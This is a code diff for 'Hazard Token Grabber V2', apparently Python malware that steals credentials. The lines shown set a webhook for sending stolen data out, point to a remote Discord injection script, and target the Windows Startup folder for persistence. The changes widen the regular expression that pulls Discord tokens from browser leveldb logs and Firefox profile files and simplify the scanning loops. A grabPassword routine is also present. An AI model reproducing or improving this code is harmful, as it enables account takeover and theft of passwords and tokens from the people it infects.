@@ -20,7 +20,7 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-    # replace WEBHOOK_HERE with your webhook
+    # replace WEBHOOK_HERE with your webhook ↓↓
     'webhook': "WEBHOOK_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
@@ -119,7 +119,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.dir = mkdtemp()
         self.startup_loc = self.roaming + \
             "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
+        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
         self.sep = os.sep
@@ -334,9 +334,8 @@ class Hazard_Token_Grabber_V2(functions):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (self.regex):
-                            for token in findall(regex, line):
-                                asyncio.run(self.checkToken(token))
+                        for token in findall(self.regex, line):
+                            asyncio.run(self.checkToken(token))
 
         if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
@@ -344,9 +343,8 @@ class Hazard_Token_Grabber_V2(functions):
                     if not _file.endswith('.sqlite'):
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (self.regex):
-                            for token in findall(regex, line):
-                                asyncio.run(self.checkToken(token))
+                        for token in findall(self.regex, line):
+                            asyncio.run(self.checkToken(token))
 
     @try_extract
     def grabPassword(self):
